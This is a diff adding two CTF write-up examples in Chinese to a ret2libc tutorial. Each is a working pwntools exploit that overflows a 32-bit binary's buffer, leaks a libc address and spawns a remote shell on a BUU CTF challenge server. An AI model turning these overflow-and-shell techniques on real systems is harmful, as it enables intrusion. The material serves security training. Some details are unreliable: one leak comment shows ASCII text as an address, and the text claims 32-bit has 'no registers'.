@@ -1821,3 +1821,97 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+#### 例题 3：jarvisoj_level3
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level3)
+
+和上一道题唯一区别是 32 位。
+
+注意 32 位没有寄存器，变量直接放栈上，其实比 64 位简单一点。
+
+```
+# written by Sonnety
+from pwn import *
+from LibcSearcher import *
+
+context(os = "linux",arch = "i386",log_level = "debug")
+host = "node5.buuoj.cn"
+port = 25475
+
+io = remote(host,port)
+# io = process("./level3")
+elf = ELF("./level3")
+offset = 0x8c
+main_addr = 0x8048484    # main	08048484	
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+payload_1 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+
+def main():
+    io.recvuntil(b"Input:\n")
+    io.sendline(payload_1)
+    leak_data = io.recvn(4)
+    write_addr = u32(leak_data)
+    print(hex(write_addr))  # 0x656d6974
+    # libc = LibcSearcher('write',write_addr)
+    libc_base = write_addr - 0xd43c0
+    system = libc_base + 0x3a940
+    binsh = libc_base + 0x15902b
+    payload_2 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
+    io.recvuntil(b"Input:\n")
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 4： [OGeek2019]babyrop
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#[OGeek2019]babyrop)
+
+依旧 32 位，大概意思是会拿输入的数和一个随机数进行比对，如果错了直接退出程序，但是依旧 `strlen()` 比对，所以前加 `\x00` 跳过它。
+
+然后拿输入的第 8 个数，`bufa[7]` 当作函数的返回值，传到第二个函数里当 `read()` 的长度限制，所以我们输入 `\xFF` 超长长度。
+
+然后就开始 ret2libc 爽吃。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28281
+io = remote(host,port)
+# io = process('./pwn')
+elf = ELF('./pwn')
+
+offset = 235
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+main_addr = 0x8048825
+payload_1 = b'\x00' + b'A'*6 + b'\xFF'  # '\x00' 截断字符比对，'\xFF' 使函数返回值为 255
+
+def main():
+    io.sendline(payload_1)
+    io.recvuntil(b"Correct\n")
+    payload_2 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+    io.sendline(payload_2)
+    leak_data = io.recvn(4)
+    write_addr = u32(leak_data)
+    print(hex(write_addr))  # 0xf7e233c0 → libc6_2.23-0ubuntu11.3_i386
+    libc = write_addr - 0xd43c0
+    system = libc + 0x3a940
+    binsh = libc + 0x15902b
+    payload_3 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
+    io.sendline(payload_1)
+    io.recvuntil(b"Correct\n")
+    io.sendline(payload_3)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
